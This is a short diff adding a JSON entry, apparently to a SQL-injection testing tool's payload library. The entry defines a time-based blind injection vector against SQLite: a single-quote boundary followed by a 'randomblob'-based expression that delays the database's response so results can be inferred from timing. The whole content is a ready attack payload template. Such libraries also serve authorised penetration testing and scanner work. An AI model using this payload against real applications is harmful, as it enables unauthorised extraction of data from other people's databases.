@@ -1,0 +1,12 @@
+{
+ "dbms": "sqlite",
+ "technique": "time",
+ "boundary": {
+  "prefix": "'",
+  "suffix": "",
+  "type": "single-quote",
+  "desc": "single-quoted string"
+ },
+ "vector": "{B} AND 1=like('ABCDEFG',upper(hex(randomblob({SLEEP}00000000))))",
+ "comment": "sqlite time via single-quoted string"
+}
